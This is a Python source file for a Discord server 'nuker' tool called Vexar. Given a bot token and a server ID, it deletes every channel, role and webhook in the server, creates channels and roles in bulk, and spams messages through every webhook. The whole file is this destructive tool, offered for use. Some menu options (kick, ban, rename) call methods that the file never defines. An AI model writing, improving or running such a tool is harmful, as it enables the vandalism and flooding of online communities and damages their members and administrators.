import os
import time
import discord
from discord.ext import commands
import asyncio
from pystyle import Write, Colors, Colorate
from concurrent.futures import ThreadPoolExecutor

class Vexar:
    def __init__(self):
        self.bot_token = ""
        self.server_id = None
        self.bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
        self.guild = None
        self.thread_pool = ThreadPoolExecutor(max_workers=10)
        os.system("title ghool@NUKER")

    async def run(self):
        self.get_bot_token()
        self.get_server_id()
        await self.start_bot()

    async def run_in_threads(self, func, items):
        loop = asyncio.get_event_loop()
        tasks = [loop.run_in_executor(self.thread_pool, func, item) for item in items]
        await asyncio.gather(*tasks)

    def get_server_id(self):
        self.clear()
        self.banner()
        self.white_text("Enter the Server ID below:")
        while True:
            try:
                self.server_id = int(input("> "))
                break
            except ValueError:
                self.white_text("[ERROR] Invalid Server ID. Please enter a numeric value.")

    def get_bot_token(self):
        self.clear()
        self.banner()
        self.white_text("Enter your Discord Bot Token below:")
        self.bot_token = input("> ")

    async def start_bot(self):
        @self.bot.event
        async def on_ready():
            self.white_text(f"Bot {self.bot.user} is now online and ready!")
            self.guild = self.bot.get_guild(self.server_id)
            if not self.guild:
                self.white_text("[ERROR] Guild not found. Check the Server ID.")
                await self.bot.close()
            else:
                self.white_text(f"Connected to guild: {self.guild.name}")
                await self.homemenu()

        try:
            await self.bot.start(self.bot_token)
        except discord.LoginFailure:
            self.white_text("[ERROR] Invalid bot token.")

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def banner(self):
        banner_text = r'''
                                                     __                __
                                              ____ _/ /_  ____  ____  / /
                                             / __ `/ __ \/ __ \/ __ \/ / 
                                            / /_/ / / / / /_/ / /_/ / /  
                                            \__, /_/ /_/\____/\____/_/   
                                            /____/                     
                                         _________________________________
'''
        print(Colorate.Vertical(Colors.white_to_black, banner_text))

    def white_text(self, text):
        print(text + "\n", Colors.white)

    async def homemenu(self):
        while True:
            self.clear()
            self.banner()
            menu_options = [
                "[01] > Delete Channels     [02] > Delete Roles    [03] > Create Channels     [04] > Create Roles",
                "[05] > Create Webhooks     [06] > Delete Webhooks [07] > Spam Webhooks       [08] > Kick Members",
                "[09] > Ban Members         [10] > Change Server Name"
            ]
            for option in menu_options:
                self.white_text(option)

            option = input("Select an option: ")
            if option == "1":
                await self.delete_channels()
            elif option == "2":
                await self.delete_roles()
            elif option == "3":
                await self.create_channels()
            elif option == "4":
                await self.create_roles()
            elif option == "5":
                await self.create_webhooks()
            elif option == "6":
                await self.delete_webhooks()
            elif option == "7":
                await self.spam_webhooks()
            elif option == "8":
                await self.kick_members()
            elif option == "9":
                await self.ban_members()
            elif option == "10":
                await self.change_server_name()
            else:
                self.white_text("[ERROR] Invalid option. Please try again.")
                time.sleep(2)

    async def delete_channels(self):
        self.clear()
        self.banner()
        self.white_text("[+] Deleting all channels...")
        try:
            await self.run_in_threads(lambda c: asyncio.run_coroutine_threadsafe(c.delete(), self.bot.loop), self.guild.channels)
            self.white_text("[+] Deleted all channels in the server.")
        except Exception as e:
            self.white_text(f"[-] Failed to delete channels: {e}")

    async def create_channels(self):
        self.clear()
        self.banner()
        name = input("Enter channel name: ")
        amount = int(input("Enter number of channels: "))

        async def create_channel():
            await self.guild.create_text_channel(name)

        self.white_text(f"[+] Creating {amount} channels named {name}...")
        try:
            await asyncio.gather(*(create_channel() for _ in range(amount)))
            self.white_text(f"[+] Successfully created {amount} channels.")
        except Exception as e:
            self.white_text(f"[-] Failed to create channels: {e}")

    async def delete_roles(self):
        self.clear()
        self.banner()
        self.white_text("[+] Deleting all roles (except @everyone)...")
        try:
            await self.run_in_threads(lambda r: asyncio.run_coroutine_threadsafe(r.delete(), self.bot.loop), [r for r in self.guild.roles if r.name != "@everyone"])
            self.white_text("[+] Deleted all roles in the server.")
        except Exception as e:
            self.white_text(f"[-] Failed to delete roles: {e}")

    async def create_roles(self):
        self.clear()
        self.banner()
        name = input("Enter role name: ")
        amount = int(input("Enter number of roles: "))

        async def create_role():
            await self.guild.create_role(name=name)

        self.white_text(f"[+] Creating {amount} roles named {name}...")
        try:
            await asyncio.gather(*(create_role() for _ in range(amount)))
            self.white_text(f"[+] Successfully created {amount} roles.")
        except Exception as e:
            self.white_text(f"[-] Failed to create roles: {e}")

    async def create_webhooks(self):
        async def create_webhook(channel):
            await channel.create_webhook(name="Vexar Nuker")

        self.clear()
        self.banner()
        self.white_text("[+] Creating webhooks in all text channels...")
        try:
            await asyncio.gather(*(create_webhook(c) for c in self.guild.text_channels))
            self.white_text("[+] Created webhooks in all text channels.")
        except Exception as e:
            self.white_text(f"[-] Failed to create webhooks: {e}")

    async def delete_webhooks(self):
        async def delete_webhook(webhook):
            await webhook.delete()

        self.clear()
        self.banner()
        self.white_text("[+] Deleting all webhooks...")
        try:
            webhooks = await self.guild.webhooks()
            await asyncio.gather(*(delete_webhook(w) for w in webhooks))
            self.white_text("[+] Deleted all webhooks.")
        except Exception as e:
            self.white_text(f"[-] Failed to delete webhooks: {e}")

    async def spam_webhooks(self):
        self.clear()
        self.banner()
        message = input("Enter message to spam: ")
        amount = int(input("Enter number of messages: "))

        async def spam_webhook(webhook):
            for _ in range(amount):
                await webhook.send(message)

        self.white_text(f"[+] Spamming {amount} messages to all webhooks...")
        try:
            webhooks = await self.guild.webhooks()
            await asyncio.gather(*(spam_webhook(w) for w in webhooks))
            self.white_text(f"[+] Spammed {amount} messages to all webhooks.")
        except Exception as e:
            self.white_text(f"[-] Failed to spam webhooks: {e}")

if __name__ == "__main__":
    vexar = Vexar()
    asyncio.run(vexar.run())